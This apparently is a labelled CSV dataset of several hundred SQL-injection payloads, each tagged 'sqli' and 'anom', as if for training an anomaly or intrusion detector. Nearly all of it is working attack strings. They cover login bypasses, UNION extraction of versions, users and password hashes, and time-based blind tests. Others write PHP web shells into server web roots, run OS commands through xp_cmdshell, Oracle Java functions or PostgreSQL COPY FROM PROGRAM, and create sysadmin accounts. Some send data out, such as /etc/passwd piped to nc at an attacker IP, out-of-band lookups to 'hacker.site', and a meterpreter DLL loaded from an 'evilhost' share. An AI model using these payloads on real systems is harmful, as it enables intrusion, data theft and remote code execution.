payload,attack_type,label
"+concat(0x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e7e7472306a416e2a203a3a3c666f6e7420636f6c6f723d626c75653e20,version(),0x3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20,(select count(*) from information_schema.schemata),0x3c2f66",sqli,anom
+/*!13337concat*/(0x3c616464726573733e3c63656e7465723e3c62723e3c68313e3c666f6e7420636f6c6f723d22526564223e496e6a6563746564206279204e315a344d3c2f666f6e743e3c68313e3c2f63656e7465723e3c62723e3c666f6e7420636f6c6f723d2223663364393361223e4461746162617365207e3e3,sqli,anom
"(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)",sqli,anom
"union SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #",sqli,anom
"union select 1,(select(@)from(select(@:=0x00),(select(@)from(information_schema.processlist)where(@)in(@:=concat(@,0x3C62723E,state,0x3a,info))))a),3,4 #",sqli,anom
' UNION ALL SELECT LOAD_FILE('/etc/passwd') --,sqli,anom
GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#,sqli,anom
"[...] UNION SELECT ""<?php system($_GET['cmd']); ?>"" into outfile ""C:\\xampp\\htdocs\\backdoor.php""",sqli,anom
[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>',sqli,anom
"[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- -",sqli,anom
"[...] union all select 1,2,3,4,""<?php echo shell_exec($_GET['cmd']);?>"",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'",sqli,anom
"[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'",sqli,anom
[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';,sqli,anom
`username` varchar(20) not null,sqli,anom
/usr/lib/lib_mysqludf_sys.so,sqli,anom
SELECT sys_eval('id');,sqli,anom
select @@version into outfile '\\\\192.168.0.100\\temp\\out.txt';,sqli,anom
select @@version into dumpfile '\\\\192.168.0.100\\temp\\out.txt,sqli,anom
"select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));",sqli,anom
"select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874))",sqli,anom
select load_file('\\\\error\\abc');,sqli,anom
select load_file(0x5c5c5c5c6572726f725c5c616263);,sqli,anom
select 'osanda' into dumpfile '\\\\error\\abc';,sqli,anom
select 'osanda' into outfile '\\\\error\\abc';,sqli,anom
load data infile '\\\\error\\abc' into table database.table_name;,sqli,anom
SELECT user FROM dual UNION SELECT * FROM v$version,sqli,anom
SELECT global_name FROM global_name;,sqli,anom
SELECT name FROM V$DATABASE;,sqli,anom
SELECT instance_name FROM V$INSTANCE;,sqli,anom
SELECT SYS.DATABASE_NAME FROM DUAL;,sqli,anom
SELECT DISTINCT owner FROM all_tables;,sqli,anom
SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';,sqli,anom
SELECT column_name FROM all_tab_columns WHERE table_name = 'blah' and owner = 'foo';,sqli,anom
SELECT table_name FROM all_tables;,sqli,anom
"SELECT owner, table_name FROM all_tables;",sqli,anom
"SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';",sqli,anom
"AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])",sqli,anom
"BEGIN EXECUTE IMMEDIATE 'create or replace and compile java source named ""PwnUtil"" as import java.io.*; public class PwnUtil{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = """";while ((stemp = myReader.readLine()) != null) str += stemp + ""\n"";myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = """";while((stemp = myReader.readLine()) != null) str += stemp + ""\n"";myReader.close();return str;} catch (Exception e){ return e.toString();}}};'; END;",sqli,anom
BEGIN EXECUTE IMMEDIATE 'create or replace function PwnUtilFunc(p_cmd in varchar2) return varchar2 as language java name ''PwnUtil.runCmd(java.lang.String) return String'';'; END;,sqli,anom
SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;,sqli,anom
SELECT TO_CHAR(dbms_xmlquery.getxml('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c61636520616e6420636f6d70696c65206a61766120736f75726365206e616d6564202270776e7574696c2220617320696d706f7274206a6176612e696f2e2a3b7075626c696320636c6173732070776e7574696c7b7075626c69632073746174696320537472696e672072756e28537472696e672061726773297b7472797b4275666665726564526561646572206d726561643d6e6577204275666665726564526561646572286e657720496e70757453747265616d5265616465722852756e74696d652e67657452756e74696d6528292e657865632861726773292e676574496e70757453747265616d282929293b20537472696e67207374656d702c207374723d22223b207768696c6528287374656d703d6d726561642e726561644c696e6528292920213d6e756c6c29207374722b3d7374656d702b225c6e223b206d726561642e636c6f736528293b2072657475726e207374723b7d636174636828457863657074696f6e2065297b72657475726e20652e746f537472696e6728293b7d7d7d''));,sqli,anom
EXECUTE IMMEDIATE utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c6163652066756e6374696f6e2050776e5574696c46756e6328705f636d6420696e207661726368617232292072657475726e207661726368617232206173206c616e6775616765206a617661206e616d65202770776e7574696c2e72756e286a6176612e6c616e672e537472696e67292072657475726e20537472696e67273b'')); end;')) results FROM dual,sqli,anom
SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;,sqli,anom
SELECT version(),sqli,anom
SELECT user;,sqli,anom
SELECT current_user;,sqli,anom
SELECT session_user;,sqli,anom
SELECT usename FROM pg_user;,sqli,anom
SELECT getpgusername();,sqli,anom
SELECT usename FROM pg_user,sqli,anom
"SELECT usename, passwd FROM pg_shadow",sqli,anom
SELECT usename FROM pg_user WHERE usesuper IS TRUE,sqli,anom
"SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user",sqli,anom
SELECT current_database(),sqli,anom
SELECT datname FROM pg_database,sqli,anom
SELECT table_name FROM information_schema.tables,sqli,anom
SELECT column_name FROM information_schema.columns WHERE table_name='data_table',sqli,anom
"' and substr(version(),1,10) = 'PostgreSQL' and '1  -> OK",sqli,anom
"' and substr(version(),1,10) = 'PostgreXXX' and '1  -> KO",sqli,anom
AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])),sqli,anom
"AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))",sqli,anom
http://host/vuln.php?id=injection';create table NotSoSecure (data varchar(200));--,sqli,anom
select pg_ls_dir('./');,sqli,anom
"select pg_read_file('PG_VERSION', 0, 200);",sqli,anom
CREATE TABLE temp(t TEXT);,sqli,anom
COPY temp FROM '/etc/passwd';,sqli,anom
SELECT * FROM temp limit 1 offset 0;,sqli,anom
CREATE TABLE pentestlab (t TEXT);,sqli,anom
INSERT INTO pentestlab(t) VALUES('nc -lvvp 2346 -e /bin/bash');,sqli,anom
SELECT * FROM pentestlab;,sqli,anom
COPY pentestlab(t) TO '/tmp/pentestlab';,sqli,anom
DROP TABLE IF EXISTS cmd_exec; ,sqli,anom
CREATE TABLE cmd_exec(cmd_output text);,sqli,anom
COPY cmd_exec FROM PROGRAM 'id';,sqli,anom
SELECT * FROM cmd_exec;,sqli,anom
DROP TABLE IF EXISTS cmd_exec;,sqli,anom
"CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;",sqli,anom
SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');,sqli,anom
select sqlite_version();      ,sqli,anom
SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%',sqli,anom
SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name',sqli,anom
"SELECT replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'')),""TEXT"",''),""INTEGER"",''),""AUTOINCREMENT"",''),""PRIMARY KEY"",''),""UNIQUE"",''),""NUMERIC"",''),""REAL"",''),""BLOB"",''),""NOT NULL"",''),"","",'~~') FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name'",sqli,anom
and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) < number_of_table,sqli,anom
and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0)=table_name_length_number,sqli,anom
"and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) > hex('some_char')",sqli,anom
"AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))",sqli,anom
ATTACH DATABASE '/var/www/lol.php' AS lol;,sqli,anom
CREATE TABLE lol.pwn (dataz text);,sqli,anom
INSERT INTO lol.pwn (dataz) VALUES ('<?system($_GET['cmd']); ?>');--,sqli,anom
"UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--",sqli,anom
',sqli,anom
27%,sqli,anom
"
%22
#
%23
;
%3B
)
Wildcard (*)
&apos; 
%%2727
%25%27
`+HERP
'||'DERP
'+'herp
' 'DERP
'%20'HERP
'%2B'HERP
page.asp?id=1 or 1=1
page.asp?id=1' or 1=1
page.asp?id=1 or 1=1",sqli,anom
page.asp?id=1 and 1=2,sqli,anom
Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was,sqli,anom
"transformed into U+0022 QUOTATION MARK ("")",sqli,anom
Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was,sqli,anom
transformed into U+0027 APOSTROPHE ('),sqli,anom
"[""conv('a',16,2)=conv('a',16,2)""                   ,""MYSQL""],",sqli,anom
"[""connection_id()=connection_id()""                 ,""MYSQL""],",sqli,anom
"[""crc32('MySQL')=crc32('MySQL')""                   ,""MYSQL""],",sqli,anom
"[""BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)""       ,""MSSQL""],",sqli,anom
"[""@@CONNECTIONS>0""                                 ,""MSSQL""],",sqli,anom
"[""@@CONNECTIONS=@@CONNECTIONS""                     ,""MSSQL""],",sqli,anom
"[""@@CPU_BUSY=@@CPU_BUSY""                           ,""MSSQL""],",sqli,anom
"[""USER_ID(1)=USER_ID(1)""                           ,""MSSQL""],",sqli,anom
"[""ROWNUM=ROWNUM""                                   ,""ORACLE""],",sqli,anom
"[""RAWTOHEX('AB')=RAWTOHEX('AB')""                   ,""ORACLE""],",sqli,anom
"[""LNNVL(0=123)""                                    ,""ORACLE""],",sqli,anom
"[""5::int=5""                                        ,""POSTGRESQL""],",sqli,anom
"[""5::integer=5""                                    ,""POSTGRESQL""],",sqli,anom
"[""pg_client_encoding()=pg_client_encoding()""       ,""POSTGRESQL""],",sqli,anom
"[""get_current_ts_config()=get_current_ts_config()"" ,""POSTGRESQL""],",sqli,anom
"[""quote_literal(42.5)=quote_literal(42.5)""         ,""POSTGRESQL""],",sqli,anom
"[""current_database()=current_database()""           ,""POSTGRESQL""],",sqli,anom
"[""sqlite_version()=sqlite_version()""               ,""SQLITE""],",sqli,anom
"[""last_insert_rowid()>1""                           ,""SQLITE""],",sqli,anom
"[""last_insert_rowid()=last_insert_rowid()""         ,""SQLITE""],",sqli,anom
"[""val(cvar(1))=1""                                  ,""MSACCESS""],",sqli,anom
"[""IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0""               ,""MSACCESS""],",sqli,anom
"[""cdbl(1)=cdbl(1)""                                 ,""MSACCESS""],",sqli,anom
"[""1337=1337"",   ""MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL""],",sqli,anom
"[""'i'='i'"",     ""MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL""],",sqli,anom
'-',sqli,anom
' ',sqli,anom
'&',sqli,anom
'^',sqli,anom
'*',sqli,anom
' or 1=1 limit 1 -- -+,sqli,anom
"'=""or'",sqli,anom
' or ''-',sqli,anom
' or '' ',sqli,anom
' or ''&',sqli,anom
' or ''^',sqli,anom
' or ''*',sqli,anom
'-||0',sqli,anom
-||0,sqli,anom
-,sqli,anom
 ,sqli,anom
&,sqli,anom
^,sqli,anom
*,sqli,anom
" or ""-",sqli,anom
" or "" ",sqli,anom
" or ""&",sqli,anom
" or ""^",sqli,anom
" or ""*",sqli,anom
or true--,sqli,anom
" or true--
' or true--
) or true--",sqli,anom
') or true--,sqli,anom
' or 'x'='x,sqli,anom
') or ('x')=('x,sqli,anom
')) or (('x'))=(('x,sqli,anom
" or x""=""x",sqli,anom
") or (x"")=(""x",sqli,anom
")) or ((x""))=((""x",sqli,anom
or 2 like 2,sqli,anom
or 1=1,sqli,anom
or 1=1--,sqli,anom
or 1=1#,sqli,anom
or 1=1/*,sqli,anom
admin' --,sqli,anom
admin' -- -,sqli,anom
admin' #,sqli,anom
admin'/*,sqli,anom
admin' or '2' LIKE '1,sqli,anom
admin' or 2 LIKE 2--,sqli,anom
admin' or 2 LIKE 2#,sqli,anom
admin') or 2 LIKE 2#,sqli,anom
admin') or 2 LIKE 2--,sqli,anom
admin') or ('2' LIKE '2,sqli,anom
admin') or ('2' LIKE '2'#,sqli,anom
admin') or ('2' LIKE '2'/*,sqli,anom
admin' or '1'='1,sqli,anom
admin' or '1'='1'--,sqli,anom
admin' or '1'='1'#,sqli,anom
admin' or '1'='1'/*,sqli,anom
admin'or 1=1 or ''=',sqli,anom
admin' or 1=1,sqli,anom
admin' or 1=1--,sqli,anom
admin' or 1=1#,sqli,anom
admin' or 1=1/*,sqli,anom
admin') or ('1'='1,sqli,anom
admin') or ('1'='1'--,sqli,anom
admin') or ('1'='1'#,sqli,anom
admin') or ('1'='1'/*,sqli,anom
admin') or '1'='1,sqli,anom
admin') or '1'='1'--,sqli,anom
admin') or '1'='1'#,sqli,anom
admin') or '1'='1'/*,sqli,anom
"1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",sqli,anom
"admin"" --",sqli,anom
"admin"" #",sqli,anom
"admin""/*",sqli,anom
"admin"" or ""1""=""1",sqli,anom
"admin"" or ""1""=""1""--",sqli,anom
"admin"" or ""1""=""1""#",sqli,anom
"admin"" or ""1""=""1""/*",sqli,anom
"admin""or 1=1 or """"=""",sqli,anom
"admin"" or 1=1",sqli,anom
"admin"" or 1=1--",sqli,anom
"admin"" or 1=1#",sqli,anom
"admin"" or 1=1/*",sqli,anom
"admin"") or (""1""=""1",sqli,anom
"admin"") or (""1""=""1""--",sqli,anom
"admin"") or (""1""=""1""#",sqli,anom
"admin"") or (""1""=""1""/*",sqli,anom
"admin"") or ""1""=""1",sqli,anom
"admin"") or ""1""=""1""--",sqli,anom
"admin"") or ""1""=""1""#",sqli,anom
"admin"") or ""1""=""1""/*",sqli,anom
"1234 "" AND 1=0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",sqli,anom
"SELECT * FROM admin WHERE pass = '.md5($password,true).""'""",sqli,anom
"admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",sqli,anom
?id=1%09and%091=1%09--,sqli,anom
?id=1%0Dand%0D1=1%0D--,sqli,anom
?id=1%0Cand%0C1=1%0C--,sqli,anom
?id=1%0Band%0B1=1%0B--,sqli,anom
?id=1%0Aand%0A1=1%0A--,sqli,anom
?id=1%A0and%A01=1%A0--,sqli,anom
?id=1/*comment*/and/**/1=1/**/--,sqli,anom
?id=(1)and(1)=(1)--,sqli,anom
"LIMIT 0,1 ",sqli,anom
"SUBSTR('SQL',1,1)",sqli,anom
"SELECT 1,2,3,4",sqli,anom
"?id=1 and substring(version(),1,1)like(5)",sqli,anom
"?id=1 and substring(version(),1,1)not in(4,3)",sqli,anom
"?id=1 and substring(version(),1,1)in(4,3)",sqli,anom
"?id=1 and substring(version(),1,1) between 3 and 4",sqli,anom
?id=1 AND 1=1,sqli,anom
?id=1 AnD 1=1,sqli,anom
?id=1 aNd 1=1,sqli,anom
AND   -> &&,sqli,anom
OR    -> ||,sqli,anom
"=     -> LIKE,REGEXP, BETWEEN, not < and not >",sqli,anom
> X   -> not between 0 and X,sqli,anom
WHERE -> HAVING,sqli,anom
select * from mysql.innodb_table_stats;,sqli,anom
show tables in dvwa;,sqli,anom
select @@innodb_version;,sqli,anom
==,sqli,anom
=,sqli,anom
',sqli,anom
' --,sqli,anom
' #,sqli,anom
' –,sqli,anom
'--,sqli,anom
'/*,sqli,anom
'#,sqli,anom
" --
 #",sqli,anom
"/*
' and 1='1
' and a='a
 or 1=1
 or true
' or ''='
 or """"=""",sqli,anom
1?) and '1?='1–,sqli,anom
"' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055",sqli,anom
" AND 1=0 UNION ALL SELECT "", 81dc9bdb52d04dc20036dbd8313ed055",sqli,anom
 and 1=1,sqli,anom
 and 1=1–,sqli,anom
' and 'one'='one,sqli,anom
' and 'one'='one–,sqli,anom
' group by password having 1=1--,sqli,anom
' group by userid having 1=1--,sqli,anom
' group by username having 1=1--,sqli,anom
 like '%',sqli,anom
 or 0=0 --,sqli,anom
 or 0=0 #,sqli,anom
 or 0=0 –,sqli,anom
' or         0=0 #,sqli,anom
' or 0=0 --,sqli,anom
' or 0=0 #,sqli,anom
' or 0=0 –,sqli,anom
" or 0=0 --
 or 0=0 #",sqli,anom
" or 0=0 –
%' or '0'='0
 or 1=1
 or 1=1--
 or 1=1/*
 or 1=1#
 or 1=1–
' or 1=1--
' or '1'='1
' or '1'='1'--
' or '1'='1'/*
' or '1'='1'#
' or '1?='1
' or 1=1
' or 1=1 --
' or 1=1 –
' or 1=1--
' or 1=1;#
' or 1=1/*
' or 1=1#
' or 1=1–
') or '1'='1
') or '1'='1--
') or '1'='1'--
') or '1'='1'/*
') or '1'='1'#
') or ('1'='1
') or ('1'='1--
') or ('1'='1'--
') or ('1'='1'/*
') or ('1'='1'#
'or'1=1
'or'1=1?
 or ""1""=""1",sqli,anom
" or 1""=""1""--",sqli,anom
" or 1""=""1""/*",sqli,anom
" or 1""=""1""#",sqli,anom
" or 1=1
 or 1=1 --",sqli,anom
" or 1=1 –
 or 1=1--",sqli,anom
" or 1=1/*
 or 1=1#",sqli,anom
" or 1=1–
) or ""1""=""1",sqli,anom
") or 1""=""1""--",sqli,anom
") or 1""=""1""/*",sqli,anom
") or 1""=""1""#",sqli,anom
") or (1""=""1",sqli,anom
") or (1""=""1""--",sqli,anom
") or (1""=""1""/*",sqli,anom
") or (1""=""1""#",sqli,anom
) or '1?='1–,sqli,anom
) or ('1?='1–,sqli,anom
' or 1=1 LIMIT 1;#,sqli,anom
'or 1=1 or ''=',sqli,anom
"or 1=1 or ""=",sqli,anom
' or 'a'='a,sqli,anom
' or a=a--,sqli,anom
' or a=a–,sqli,anom
') or ('a'='a,sqli,anom
" or a""=""a",sqli,anom
") or (a""=""a",sqli,anom
"') or ('a'='a and hi"") or (""a""=""a",sqli,anom
' or 'one'='one,sqli,anom
' or 'one'='one–,sqli,anom
' or uid like '%,sqli,anom
' or uname like '%,sqli,anom
' or userid like '%,sqli,anom
' or user like '%,sqli,anom
' or username like '%,sqli,anom
' or 'x'='x,sqli,anom
') or ('x'='x,sqli,anom
" or x""=""x",sqli,anom
' OR 'x'='x'#;,sqli,anom
'=' 'or' and '=' 'or',sqli,anom
"' UNION ALL SELECT 1, @@version;#",sqli,anom
"' UNION ALL SELECT system_user(),user();#",sqli,anom
"' UNION select table_schema,table_name FROM information_Schema.tables;#",sqli,anom
"admin' and substring(password/text(),1,1)='7",sqli,anom
"' and substring(password/text(),1,1)='7",sqli,anom
' or 1=1 limit 1 -- -+,sqli,anom
"'=""or'",sqli,anom
waitfor delay '0:0:20' /* ,sqli,anom
 waitfor delay '0:0:20' --,sqli,anom
' waitfor delay '0:0:20' /* ,sqli,anom
' waitfor delay '0:0:20' --,sqli,anom
" waitfor delay '0:0:20' /* 
 waitfor delay '0:0:20' --",sqli,anom
) waitfor delay '0:0:20' /* ,sqli,anom
) waitfor delay '0:0:20' --,sqli,anom
)) waitfor delay '0:0:20' /* ,sqli,anom
)) waitfor delay '0:0:20' --,sqli,anom
))) waitfor delay '0:0:20' /* ,sqli,anom
))) waitfor delay '0:0:20' --,sqli,anom
)))) waitfor delay '0:0:20' /* ,sqli,anom
)))) waitfor delay '0:0:20' --,sqli,anom
))))) waitfor delay '0:0:20' --,sqli,anom
)))))) waitfor delay '0:0:20' --,sqli,anom
') waitfor delay '0:0:20' /* ,sqli,anom
') waitfor delay '0:0:20' --,sqli,anom
") waitfor delay '0:0:20' /* 
) waitfor delay '0:0:20' --",sqli,anom
')) waitfor delay '0:0:20' /* ,sqli,anom
')) waitfor delay '0:0:20' --,sqli,anom
")) waitfor delay '0:0:20' /* 
)) waitfor delay '0:0:20' --",sqli,anom
'))) waitfor delay '0:0:20' /* ,sqli,anom
'))) waitfor delay '0:0:20' --,sqli,anom
"))) waitfor delay '0:0:20' /* 
))) waitfor delay '0:0:20' --",sqli,anom
')))) waitfor delay '0:0:20' /* ,sqli,anom
')))) waitfor delay '0:0:20' --,sqli,anom
")))) waitfor delay '0:0:20' /* 
)))) waitfor delay '0:0:20' --",sqli,anom
'))))) waitfor delay '0:0:20' /* ,sqli,anom
'))))) waitfor delay '0:0:20' --,sqli,anom
"))))) waitfor delay '0:0:20' /* 
))))) waitfor delay '0:0:20' --",sqli,anom
')))))) waitfor delay '0:0:20' /* ,sqli,anom
')))))) waitfor delay '0:0:20' --,sqli,anom
")))))) waitfor delay '0:0:20' /* 
)))))) waitfor delay '0:0:20' --",sqli,anom
# you will need to customize/modify some of the vaules in the queries for best effect,sqli,anom
'; exec master..xp_cmdshell 'ping 10.10.1.2'--,sqli,anom
'create user name identified by 'pass123' --,sqli,anom
'create user name identified by pass123 temporary tablespace temp default tablespace users; ,sqli,anom
' ; drop table temp --,sqli,anom
"'exec sp_addlogin 'name' , 'password' --",sqli,anom
"' exec sp_addsrvrolemember 'name' , 'sysadmin' --",sqli,anom
"' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --",sqli,anom
' grant connect to name; grant resource to name; --,sqli,anom
"' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)",sqli,anom
' or 1=1 --,sqli,anom
' union (select @@version) --,sqli,anom
"' union (select NULL, (select @@version)) --",sqli,anom
"' union (select NULL, NULL, (select @@version)) --",sqli,anom
"' union (select NULL, NULL, NULL,  (select @@version)) --",sqli,anom
"' union (select NULL, NULL, NULL, NULL,  (select @@version)) --",sqli,anom
"' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --",sqli,anom
# ms-sqli info disclosure payload fuzzfile,sqli,anom
# replace regex with your fuzzer for best results <attackerip> <sharename>,sqli,anom
"# run wireshark or tcpdump, look for incoming smb or icmp packets from victim",sqli,anom
# might need to terminate payloads with ;--,sqli,anom
select @@version,sqli,anom
select @@servernamee,sqli,anom
select @@microsoftversione,sqli,anom
select * from master..sysserverse,sqli,anom
select * from sysusers,sqli,anom
exec master..xp_cmdshell 'ipconfig+/all',sqli,anom
exec master..xp_cmdshell 'net+view',sqli,anom
exec master..xp_cmdshell 'net+users',sqli,anom
exec master..xp_cmdshell 'ping+<attackerip>',sqli,anom
BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat',sqli,anom
"create table myfile (line varchar(8000))"" bulk insert foo from 'c:\inetpub\wwwroot\auth.aspâ'"" select * from myfile""--",sqli,anom
1'1,sqli,anom
1 exec sp_ (or exec xp_),sqli,anom
1 and 1=1,sqli,anom
1' and 1=(select count(*) from tablenames); --,sqli,anom
1 or 1=1,sqli,anom
1' or '1'='1,sqli,anom
"and 0=benchmark(3000000,MD5(1))%20/*",sqli,anom
" and 0=benchmark(3000000,MD5(1))%20--",sqli,anom
" and 0=benchmark(3000000,MD5(1))%20%23",sqli,anom
"' and 0=benchmark(3000000,MD5(1))%20/*",sqli,anom
"' and 0=benchmark(3000000,MD5(1))%20--",sqli,anom
"' and 0=benchmark(3000000,MD5(1))%20%23",sqli,anom
" and 0=benchmark(3000000,MD5(1))%20/*
 and 0=benchmark(3000000,MD5(1))%20--",sqli,anom
" and 0=benchmark(3000000,MD5(1))%20%23
) and 0=benchmark(3000000,MD5(1))%20/*
) and 0=benchmark(3000000,MD5(1))%20--
) and 0=benchmark(3000000,MD5(1))%20%23
)) and 0=benchmark(3000000,MD5(1))%20/*
)) and 0=benchmark(3000000,MD5(1))%20--
)) and 0=benchmark(3000000,MD5(1))%20%23
))) and 0=benchmark(3000000,MD5(1))%20/*
))) and 0=benchmark(3000000,MD5(1))%20--
))) and 0=benchmark(3000000,MD5(1))%20%23
)))) and 0=benchmark(3000000,MD5(1))%20/*
)))) and 0=benchmark(3000000,MD5(1))%20--
)))) and 0=benchmark(3000000,MD5(1))%20%23
') and 0=benchmark(3000000,MD5(1))%20/*
') and 0=benchmark(3000000,MD5(1))%20--
') and 0=benchmark(3000000,MD5(1))%20%23
) and 0=benchmark(3000000,MD5(1))%20/*",sqli,anom
") and 0=benchmark(3000000,MD5(1))%20--
) and 0=benchmark(3000000,MD5(1))%20%23",sqli,anom
"')) and 0=benchmark(3000000,MD5(1))%20/*",sqli,anom
"')) and 0=benchmark(3000000,MD5(1))%20--",sqli,anom
"')) and 0=benchmark(3000000,MD5(1))%20%23",sqli,anom
")) and 0=benchmark(3000000,MD5(1))%20/*
)) and 0=benchmark(3000000,MD5(1))%20--",sqli,anom
")) and 0=benchmark(3000000,MD5(1))%20%23
'))) and 0=benchmark(3000000,MD5(1))%20/*
'))) and 0=benchmark(3000000,MD5(1))%20--
'))) and 0=benchmark(3000000,MD5(1))%20%23
))) and 0=benchmark(3000000,MD5(1))%20/*",sqli,anom
"))) and 0=benchmark(3000000,MD5(1))%20--
))) and 0=benchmark(3000000,MD5(1))%20%23",sqli,anom
"')))) and 0=benchmark(3000000,MD5(1))%20/*",sqli,anom
"')))) and 0=benchmark(3000000,MD5(1))%20--",sqli,anom
"')))) and 0=benchmark(3000000,MD5(1))%20%23",sqli,anom
")))) and 0=benchmark(3000000,MD5(1))%20/*
)))) and 0=benchmark(3000000,MD5(1))%20--",sqli,anom
